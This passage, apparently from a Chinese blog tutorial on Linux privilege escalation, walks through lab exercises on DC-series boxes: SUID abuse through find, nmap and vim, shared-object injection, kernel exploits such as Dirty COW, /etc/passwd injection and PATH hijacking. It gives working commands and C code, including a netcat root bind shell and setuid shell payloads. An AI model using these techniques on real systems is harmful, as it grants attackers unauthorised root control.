+find / \( -perm -o w -perm -o x \) -type d <span class="hljs-number">2</span>&gt;/dev/null   # world-writeable &amp; executable folders</code></pre>
+<h2 id="查看安装过的工具">查看安装过的工具</h2>
+<pre><code class="hljs scss">find / -name perl*
+find / -name python*
+find / -name gcc*
+...</code></pre>
+<h1 id="0x04-linux提权">0x04 Linux提权</h1>
+<p>这里存在部分操作较为简单的提权操作，而我也没有对应的靶机，也懒得去搭，因此会有部分直接cv的别的师傅的成果</p>
+<h2 id="suid提权">SUID提权</h2>
+<p>自动化利用工具：- <a target="_blank" rel="noopener" href="https://github.com/Jewel591/suidcheck">https://github.com/Jewel591/suidcheck</a></p>
+<blockquote>
+<p>什么是suid？suid全称是<strong>S</strong>et owner&nbsp;<strong>U</strong>ser&nbsp;<strong>ID</strong>&nbsp;up on execution。这是Linux给可执行文件的一个属性。通俗的理解为其他用户执行这个程序的时候可以用该程序所有者/组的权限。需要注意的是，只有程序的所有者是0号或其他super user，同时拥有suid权限，才可以提权。</p>
+</blockquote>
+<p>这里推荐 P师傅的&nbsp;<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p>
+<p>常见的可用来提权的Linux 可执行文件有：Nmap, Vim, find, bash, more, less, nano, cp</p>
+<p>查看可以suid 提权的可执行文件</p>
+<pre><code class="hljs scss">find / -perm -u=s -type f <span class="hljs-number">2</span>&gt;/dev/null</code></pre>
+<h3 id="find">find</h3>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543387.png" alt></p>
+<pre><code class="hljs scss">ls -al /usr/bin/find
+-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">162424</span> Jan  <span class="hljs-number">6</span>  <span class="hljs-number">2012</span> /usr/bin/find</code></pre>
+<blockquote>
+<p>实用程序find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。</p>
+</blockquote>
+<p>比如：DC -1 靶机就是利用find 命令进行root 用户来执行命令</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543389.png" alt></p>
+<p>大部分Linux 系统都安装了nc。使用<code>find aaa - exec netcat -lvp 5555 -e /bin/sh \;</code>&nbsp;即可成功反弹root shell</p>
+<h3 id="nmap">nmap</h3>
+<p>早期nmap 具有交互模式，version 2.02～5.21（5.2.0）。这里我直接展示成果了</p>
+<p><code>namp -V</code>&nbsp;查看nmap 版本信息<br>
+<code>nmap --interactive</code></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543390.png" alt><br>
+这里msf中含有利用SUID nmap提权的exp：<code>search nmap</code>&nbsp;然后利用&nbsp;<code>exploit/unix/local/setuid_nmap</code>&nbsp;漏洞利用模块即可</p>
+<p>5.2.0 之后，nmap 还可以通过执行脚本来提权。</p>
+<pre><code class="hljs scss"># nse 脚本，shell<span class="hljs-selector-class">.nse</span>
+os<span class="hljs-selector-class">.execute</span>('/bin/sh')
+# nmap 提权
+nmap <span class="hljs-attr">--script</span>=shell<span class="hljs-selector-class">.nse</span> 
+# 在某些发行版的Linux 可能会提权失败。具体原理移步<span class="hljs-selector-tag">p</span> 师傅文章</code></pre>
+<p>或者</p>
+<pre><code class="hljs scss">echo 'os<span class="hljs-selector-class">.execute</span>("/bin/sh")' &gt; getshell
+sudo nmap <span class="hljs-attr">--script</span>=getshell</code></pre>
+<p>参考DC 6 靶机：<a target="_blank" rel="noopener" href="https://hack-for.fun/posts/8886.html#%E6%8F%90%E6%9D%83">https://hack-for.fun/posts/8886.html#%E6%8F%90%E6%9D%83</a></p>
+<h3 id="vim">Vim</h3>
+<p>如果vim 是通过SUID运行，就会继承root用户的权限。可读取只有root能读取的文件。</p>
+<p><code>vim /etc/shadow</code></p>
+<p>vim 运行shell</p>
+<pre><code class="hljs scss">vim
+:set shell=/bin/sh
+:shell</code></pre>
+<p>同理，满足条件的 less 和 more 都可。</p>
+<h3 id="二进制文件so注入提权">二进制文件.so注入提权</h3>
+<blockquote>
+<p>执行程序时，它将尝试加载所需的共享对象。<br>
+通过使用称为strace 的程序，我们可以跟踪这些系统呼叫并确定是否未找到任何共享对象。<br>
+如果我们可以写信给程序尝试打开的位置，我们可以创建一个共享对象，并在加载时生成root</p>
+</blockquote>
+<p>在目标上查找SUID/SGID文件 ：<br>
+<code>find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</code></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543391.png" alt><br>
+<code>suid-so</code>文件在root用户权限下执行</p>
+<p>在SUID文件上运行分层：（验证它是否正确加载.so文件。可以通过运行以下命令来检查：）</p>
+<pre><code class="hljs scss">strace /usr/local/bin/suid-so <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | grep -iE "open|access|no such  file"
+<span class="hljs-comment">//strace &lt;SUID-BINARY&gt; 2&gt;&amp;1 | grep -i -E "open|access|no such file"</span></code></pre>
+<p>例如，遇到类似 <em>“open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)”</em> 的错误表明存在潜在的利用可能。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543392.png" alt><br>
+可以看到找不到共享对象<code>libcalc.so</code>，程序正在查看用户的家庭目录，我们可以写东西给这个目录</p>
+<blockquote>
+<p>要利用这个问题，可以按照以下步骤创建一个 C 文件，比如 <em>“/path/to/.config/libcalc.c”</em>，其中包含以下代码：</p>
+</blockquote>
+<p>创建 /home/user/.config目录，接着创建<code>libcalc.c</code>内容如下：</p>
+<pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+
+<span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">()</span> __<span class="hljs-title function_">attribute__</span><span class="hljs-params">((constructor))</span>;
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">()</span>{
+system(<span class="hljs-string">"cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p"</span>);
+}</code></pre>
+<p>这段代码一旦编译并执行，旨在通过操纵文件权限并以提升的权限执行shell来提升权限。</p>
+<p>使用以下命令将上述C文件编译为共享对象（.so）文件：</p>
+<pre><code class="hljs scss">gcc -shared -o /path/to/<span class="hljs-selector-class">.config</span>/libcalc<span class="hljs-selector-class">.so</span> -fPIC /path/to/<span class="hljs-selector-class">.config</span>/libcalc<span class="hljs-selector-class">.c</span></code></pre>
+<h2 id="内核漏洞提权">内核漏洞提权</h2>
+<p>以下先来一个常规的思路吧，借用别的师傅成果。DC3靶机：<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543393.png" alt></p>
+<p><code>searchsploit Ubuntu 16.04</code>，将exp 下载下来，解压，编译，运行，即可get root 权限。<br>
+<code>tar xvf exploit.tar</code><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543394.png" alt><br>
+<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/39772">https://www.exploit-db.com/exploits/39772</a><br>
+还有大名鼎鼎的CVE-2016-5195，脏牛漏洞。（Linux kernel &gt;=2.6.22 并且Android也受影响</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/timwr/CVE-2016-5195">https://github.com/timwr/CVE-2016-5195</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></li>
+<li>复现参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/df72d1ee1e3e">https://www.jianshu.com/p/df72d1ee1e3e</a><br>
+漏洞原理如下：<br>
+该漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。具体分析请查看官方分析。<br>
+其他的内核漏洞：</li>
+</ul>
+<ol>
+<li>
+<p>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) – ‘overlayfs’ Local Root Shell<br>
+<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/37292/">https://www.exploit-db.com/exploits/37292/</a></p>
+</li>
+<li>
+<p>Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) – ‘overlayfs’ Local Root Exploit<br>
+<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/39166/">https://www.exploit-db.com/exploits/39166/</a></p>
+</li>
+<li>
+<p>Linux Kernel 4.3.3 – ‘overlayfs’ Local Privilege Escalation<br>
+<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/39230/">https://www.exploit-db.com/exploits/39230/</a></p>
+</li>
+<li>
+<p>Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)<br>
+<a target="_blank" rel="noopener" href="https://github.com/oneoy/CVE-2019-13272">https://github.com/oneoy/CVE-2019-13272</a></p>
+</li>
+<li>
+<p>Linux Kernel Version 4.14-4.4 仅影响Ubuntu/Debian发行版本(CVE-2017-16995)<br>
+<a target="_blank" rel="noopener" href="https://github.com/Al1ex/CVE-2017-16995">https://github.com/Al1ex/CVE-2017-16995</a><br>
+<a target="_blank" rel="noopener" href="https://github.com/Jewel591/Privilege-Escalation">https://github.com/Jewel591/Privilege-Escalation</a></p>
+</li>
+<li>
+<p>Sudo-Security-Bypass-CVE-2019-14287<br>
+<a target="_blank" rel="noopener" href="https://github.com/shallvhack/Sudo-Security-Bypass-CVE-2019-14287">https://github.com/shallvhack/Sudo-Security-Bypass-CVE-2019-14287</a><br>
+<a target="_blank" rel="noopener" href="https://github.com/M108Falcon/Sudo-CVE-2019-14287">https://github.com/M108Falcon/Sudo-CVE-2019-14287</a><br>
+<a target="_blank" rel="noopener" href="https://github.com/CMNatic/Dockerized-CVE-2019-14287">https://github.com/CMNatic/Dockerized-CVE-2019-14287</a></p>
+</li>
+<li>
+<p>Linux内核漏洞提权汇总<br>
+<a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a><br>
+<a target="_blank" rel="noopener" href="https://github.com/lucyoa/kernel-exploits">https://github.com/lucyoa/kernel-exploits</a><br>
+<a target="_blank" rel="noopener" href="https://github.com/bwbwbwbw/linux-exploit-binaries">https://github.com/bwbwbwbw/linux-exploit-binaries</a><br>
+<a target="_blank" rel="noopener" href="https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack">https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack</a></p>
+</li>
+</ol>
+<blockquote>
+<p>提示：内核exploit提权有风险，有可能会崩溃系统。<br>
+1.远程主机可能会崩溃，因为许多公开可用的根漏洞利用都不十分稳定。<br>
+2.您可能会成为root用户，然后使系统崩溃。<br>
+3.漏洞利用可能会留下痕迹/日志。</p>
+</blockquote>
+<h2 id="root无密码提权">Root无密码提权</h2>
+<p>简单来说，就是一个脚本，比如py,sh等或者是一个命令。这个文件可以以root身份运行，若在无密码的情况下执行的话，我们可以通过修改脚本内容/或者直接执行这个命令，利用命令来进行一些操作，来进行提权。</p>
+<p>比如常见的：</p>
+<ul>
+<li>写入一个root身份权限的用户进入/etc/passwd 文件中<br>
+这里以DC 4 为例子：</li>
+</ul>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543395.png" alt></p>
+<p><code>teehee -a</code>&nbsp;将输入的内容追加到另一个文件中，简单说下<code>/etc/passwd</code>&nbsp;各个字段的含义：</p>
+<pre><code class="hljs scss">username:password:User ID:Group ID:comment:home directory:shell</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543396.png" alt><br>
+成功获取到root 权限。类似的操作还有很多，核心思想不变。</p>
+<h2 id="环境变量提权">环境变量提权</h2>
+<p><code>PATH</code>&nbsp;是Linux 和 Unix 操作系统中的环境变量，它指定存储可执行程序的所有bin和sbin目录。当用户在终端上执行任何命令时，它会通过PATH变量来响应用户执行的命令，并向shell发送请求以搜索可执行文件。超级用户通常还具有/sbin和/usr/sbin条目，以便于系统管理命令的执行。</p>
+<p>使用echo命令显示当前PATH环境变量：</p>
+<pre><code class="hljs scss">┌──(root㉿kali)-<span class="hljs-selector-attr">[/]</span>                                                             
+└─# echo <span class="hljs-variable">$PATH</span>                                                                  
+/root/anaconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games</code></pre>
+<p>如果你在PATH变量中看到<code>.</code>，则意味着登录用户可以从当前目录执行二进制文件/脚本</p>
+<p>我们先编译一个可执行文件shell。</p>
+<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
+{
+  setuid(<span class="hljs-number">0</span>);
+  setgid(<span class="hljs-number">0</span>);
+  system(<span class="hljs-string">"cat /etc/passwd"</span>);
+}</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543397.png" alt><br>
+在给该文件赋予权限：chmod u+s shell</p>
+<p>然后查看它的权限可以发现是有<code>s</code>&nbsp;位，即suid。</p>
+<p>现在我们在目标机器上用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>&nbsp;来查看可以suid提权的文件，发现之前编译的shell可执行文件在里面。<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543398.png" alt></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543399.png" alt><br>
+更多的操作可以参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2767">https://xz.aliyun.com/t/2767</a><br>
+接下来跟着上述文章实操一遍，其中shell.c的命令我设置为了ps<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543400.png" alt><br>
+<strong>方法一</strong></p>
+<h3 id="echo命令">echo命令</h3>
+<pre><code class="hljs scss">cd /tmp
+echo “/bin/bash” &gt; ps
+chmod <span class="hljs-number">777</span> ps
+echo <span class="hljs-variable">$PATH</span>
+export PATH=/tmp:<span class="hljs-variable">$PATH</span>
+cd /home/raj/script
+./shell
+whoami</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543401.png" alt><br>
+由于某些原因复现不了，还是上图吧<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543402.png" alt></p>
+<h3 id="copy命令">copy命令</h3>
+<pre><code class="hljs scss">cd /home/raj/script/
+cp /bin/sh /tmp/ps
+echo <span class="hljs-variable">$PATH</span>
+export PATH=/tmp:<span class="hljs-variable">$PATH</span>
+./shell
+whoami</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543403.png" alt></p>
+<h3 id="symlink命令">symlink命令</h3>
+<pre><code class="hljs scss">ln -s /bin/sh ps
+export PATH=.:<span class="hljs-variable">$PATH</span>
+./shell
+id
+whoami</code></pre>
+<p>注意：symlink也就是符号链接，如果目录拥有所有权限的话，也是能够成功运行的。在Ubuntu中，在符号链接情况下，我们已经赋予了/script目录777权限。<br>
+因此，我们看到攻击者可以控制环境变量PATH来提权并获取root权限，如图：<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543404.png" alt><br>
+<strong>方法二</strong><br>
+我们再写另一个C程序文件，内容如下</p>
+<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
+{
+  setuid(<span class="hljs-number">0</span>);
+  setgid(<span class="hljs-number">0</span>);
+  system(<span class="hljs-string">"id"</span>);
+}</code></pre>
+<p>老办法，先赋予suid权限</p>
+<h3 id="echo命令">echo命令</h3>
+<pre><code class="hljs scss">cd /tmp
+echo “/bin/bash” &gt; id
+chmod <span class="hljs-number">777</span> id
+echo <span class="hljs-variable">$PATH</span>
+export PATH=/tmp:<span class="hljs-variable">$PATH</span>
+cd /home/raj/script
+./shell2
+whoami</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543405.png" alt><br>
+<strong>方法三</strong><br>
+这回的文件内容如下：</p>
+<pre><code class="hljs scss"><span class="hljs-selector-id">#include</span>&lt;unistd<span class="hljs-selector-class">.h</span>&gt;
+void <span class="hljs-selector-tag">main</span>()
+{
+  <span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);
+  <span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);
+  <span class="hljs-built_in">system</span>("cat /etc/passwd");
+}</code></pre>
+<h3 id="nano-编辑器">nano 编辑器</h3>
+<pre><code class="hljs scss">cd /tmp
+nano cat</code></pre>
+<p>输入/bin/bash并保存<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543406.png" alt></p>
+<pre><code class="hljs scss">chmod <span class="hljs-number">777</span> cat
+ls -al cat
+echo <span class="hljs-variable">$PATH</span>
+export PATH=/tmp:<span class="hljs-variable">$PATH</span>
+cd /home/raj/script
+./raj
+whoami</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543407.png" alt><br>
+<strong>方法四</strong><br>
+与方法三基本一致，只不过命令换成了：<code>cat /home/hybcx/unfined.txt</code><br>
+cat了一个不存在的文件，随后的步骤与方法三相同。</p>
+<h3 id="点号配置错误提权">点号配置错误提权</h3>
+<p>有“.” 在PATH中表示用户可以从当前目录执行二进制文件/脚本。但是一些管理员为了避免每次都必须输入这两个额外的字符，他们在用户中添加“。”在他们的PATH中。对于攻击者而言，这是提升其特权的绝佳方法。</p>
+<p>放置.路径如果在PATH中放置点，则无需编写./binary即可执行它。那么我们将能够执行当前目录中的任何脚本或二进制文件。</p>
+<pre><code class="hljs scss"><span class="hljs-number">1</span> 带"." 在路径中–    program
+<span class="hljs-number">2</span> 不带"." 在路径中-  ./program</code></pre>
+<p>发生这种情况是因为Linux首先在“.”位置搜索程序。但是添加到PATH的开头后，就在其他任何地方搜索。</p>
+<pre><code class="hljs scss">另一个用户“小白”知道小明添加了“.” 在PATH中，
+小白告诉小明'ls'命令在他的目录中不起作用
+小白在他的目录中添加代码，这将更改sudoers文件并使他成为管理员
+小白将该代码存储在名为“ ls”并使其可执行
+小明具有root特权。她来了，并在小白的主目录中执行了'ls'命令
+恶意代码不是通过原始的'ls'命令而是通过root访问来执行
+在另存为“ ls”的文件中，添加了一个代码，该代码将打印“ Hello world”</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543408.png" alt><br>
+<code>$ PATH = .：$ {PATH} –添加'.' 在PATH变量中</code><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543409.png" alt><br>
+<code>$ ls –</code>执行的./ls文件，而不是运行列表命令。现在，如果root用户以root特权执行代码，我们可以使用root特权实现任意代码执行。</p>
+<h2 id="利用存在漏洞的命令">利用存在漏洞的命令</h2>
+<p>不可否认的是命令很多，我们不可能熟悉每一种命令的漏洞。不过我们每次遇到了都可以用<code>searchsploit</code>&nbsp;来寻找可利用的exp。这里以DC 5 靶机为例：</p>
+<p><code>ls -al</code>&nbsp;：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543410.png" alt></p>
